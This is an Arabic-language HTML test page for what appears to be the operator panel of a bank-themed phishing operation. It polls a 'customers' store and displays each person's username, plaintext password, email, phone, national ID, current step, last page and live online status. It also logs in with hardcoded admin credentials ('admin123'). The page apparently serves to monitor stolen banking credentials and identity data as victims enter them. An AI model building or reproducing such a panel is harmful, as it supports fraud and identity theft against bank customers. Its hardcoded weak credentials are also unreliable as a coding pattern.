<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>اختبار مباشر - لوحة الأدمن</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0f172a;color:#e2e8f0;padding:16px;direction:rtl}
h1{color:#10b981;margin-bottom:12px;font-size:1.2rem}
h2{color:#60a5fa;margin:16px 0 8px;font-size:1rem}
.box{background:#1e293b;border:1px solid #334155;border-radius:8px;padding:12px;margin-bottom:10px;font-size:13px}
.ok{border-color:#10b981;color:#34d399}
.err{border-color:#ef4444;color:#fca5a5}
.warn{border-color:#f59e0b;color:#fcd34d}
.customer{background:#0f172a;border:1px solid #475569;border-radius:6px;padding:10px;margin:6px 0}
.field{display:flex;gap:8px;margin:2px 0;font-size:12px}
.label{color:#94a3b8;min-width:100px}
.value{color:#e2e8f0;font-family:monospace;word-break:break-all}
.online{color:#34d399;font-weight:bold}
.offline{color:#f87171}
#counter{position:fixed;top:10px;left:10px;background:#10b981;color:white;padding:6px 14px;border-radius:20px;font-weight:bold;font-size:14px;z-index:999}
pre{background:#0f172a;padding:8px;border-radius:4px;font-size:11px;overflow-x:auto;max-height:300px;overflow-y:auto;white-space:pre-wrap;direction:ltr;text-align:left}
</style>
</head>
<body>
<div id="counter">...</div>
<h1>اختبار مباشر - هل البيانات توصل؟</h1>
<div id="results"></div>

<script type="module">
const results = document.getElementById('results');
const counter = document.getElementById('counter');
let pollCount = 0;

function addBox(html, cls) {
  const d = document.createElement('div');
  d.className = 'box ' + (cls || '');
  d.innerHTML = html;
  results.appendChild(d);
  return d;
}

function renderCustomer(id, c) {
  const p = c.presence || {};
  const isOnline = p.state === 'online';
  return `<div class="customer">
    <div class="field"><span class="label">ID:</span><span class="value">${id}</span></div>
    <div class="field"><span class="label">الاسم:</span><span class="value">${c.fullName || c.name || c.displayName || '-'}</span></div>
    <div class="field"><span class="label">المستخدم:</span><span class="value">${c.username || '-'}</span></div>
    <div class="field"><span class="label">كلمة المرور:</span><span class="value">${c.password || '-'}</span></div>
    <div class="field"><span class="label">الإيميل:</span><span class="value">${c.email || '-'}</span></div>
    <div class="field"><span class="label">الجوال:</span><span class="value">${c.phone || '-'}</span></div>
    <div class="field"><span class="label">الهوية:</span><span class="value">${c.nationalId || '-'}</span></div>
    <div class="field"><span class="label">الإمارة:</span><span class="value">${c.governorate || '-'}</span></div>
    <div class="field"><span class="label">الحالة:</span><span class="value">${c.status || '-'}</span></div>
    <div class="field"><span class="label">الخطوة:</span><span class="value">${c.currentStep || '-'}</span></div>
    <div class="field"><span class="label">آخر صفحة:</span><span class="value">${c.lastPage || '-'}</span></div>
    <div class="field"><span class="label">الاتصال:</span><span class="value ${isOnline ? 'online' : 'offline'}">${isOnline ? 'متصل' : 'غير متصل'}</span></div>
    <div class="field"><span class="label">آخر تحديث:</span><span class="value">${c.updatedAt || '-'}</span></div>
  </div>`;
}

// TEST 1: Direct API call
addBox('<b>الاختبار 1:</b> استدعاء API مباشر...', 'warn');
try {
  const r = await fetch('/api/fb/poll?path=customers');
  const d = await r.json();
  const box1 = results.lastChild;
  if (d.value && typeof d.value === 'object') {
    const keys = Object.keys(d.value);
    box1.className = 'box ok';
    box1.innerHTML = `<b>الاختبار 1: API مباشر - نجح!</b> (${keys.length} عميل)`;
    keys.forEach(k => { box1.innerHTML += renderCustomer(k, d.value[k]); });
  } else {
    box1.className = 'box err';
    box1.innerHTML = `<b>الاختبار 1: API مباشر - فشل!</b><pre>${JSON.stringify(d, null, 2)}</pre>`;
  }
} catch(e) {
  results.lastChild.className = 'box err';
  results.lastChild.innerHTML = `<b>الاختبار 1: API - خطأ!</b><pre>${e.message}</pre>`;
}

// TEST 2: Import B2c1r0a0v2.js module and use onValue
addBox('<b>الاختبار 2:</b> تحميل Firebase Bridge module...', 'warn');
try {
  const fb = await import('/_nuxt/B2c1r0a0v2.js');
  const box2 = results.lastChild;
  box2.className = 'box ok';
  box2.innerHTML = `<b>الاختبار 2: Bridge محمل!</b> Functions: ${Object.keys(fb).join(', ')}`;

  // TEST 3: Use onValue like the admin does
  const liveBox = addBox('<b>الاختبار 3:</b> بيانات حية (onValue كل 3 ثواني)...', 'warn');

  const fakeApp = {};
  const db = fb.getDatabase(fakeApp, '');
  const customersRef = fb.ref(db, 'customers');

  fb.onValue(customersRef, (snapshot) => {
    pollCount++;
    const val = snapshot.val();
    counter.textContent = `Poll #${pollCount}`;

    if (val && typeof val === 'object') {
      const keys = Object.keys(val);
      const online = keys.filter(k => val[k]?.presence?.state === 'online').length;
      liveBox.className = 'box ok';
      liveBox.innerHTML = `<b>الاختبار 3: بيانات حية - نجح!</b> (Poll #${pollCount})<br>
        <b>إجمالي:</b> ${keys.length} | <b class="online">متصل:</b> ${online}<br>`;
      keys.forEach(k => { liveBox.innerHTML += renderCustomer(k, val[k]); });
    } else {
      liveBox.className = 'box warn';
      liveBox.innerHTML = `<b>الاختبار 3:</b> لا يوجد عملاء (Poll #${pollCount})<pre>${JSON.stringify(val)}</pre>`;
    }
  }, (err) => {
    liveBox.className = 'box err';
    liveBox.innerHTML = `<b>الاختبار 3: خطأ!</b><pre>${err.message}</pre>`;
  });

} catch(e) {
  results.lastChild.className = 'box err';
  results.lastChild.innerHTML = `<b>الاختبار 2: Bridge - خطأ!</b><pre>${e.stack || e.message}</pre>`;
}

// TEST 4: Auth
addBox('<b>الاختبار 4:</b> تسجيل دخول الأدمن...', 'warn');
try {
  const r = await fetch('/api/auth/signin', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'admin@mbank.com', password: 'admin123'})
  });
  const d = await r.json();
  const box4 = results.lastChild;
  if (d.uid) {
    box4.className = 'box ok';
    box4.innerHTML = `<b>الاختبار 4: تسجيل الدخول - نجح!</b> uid=${d.uid}, role=${d.claims?.role}`;
  } else {
    box4.className = 'box err';
    box4.innerHTML = `<b>الاختبار 4: فشل!</b><pre>${JSON.stringify(d)}</pre>`;
  }
} catch(e) {
  results.lastChild.className = 'box err';
  results.lastChild.innerHTML = `<b>الاختبار 4: خطأ!</b><pre>${e.message}</pre>`;
}

// Catch all JS errors
window.addEventListener('error', e => {
  addBox(`<b>خطأ JavaScript:</b><pre>${e.message}\n${e.filename}:${e.lineno}</pre>`, 'err');
});
window.addEventListener('unhandledrejection', e => {
  addBox(`<b>خطأ Promise:</b><pre>${e.reason?.stack || e.reason?.message || e.reason}</pre>`, 'err');
});
</script>
</body>
</html>
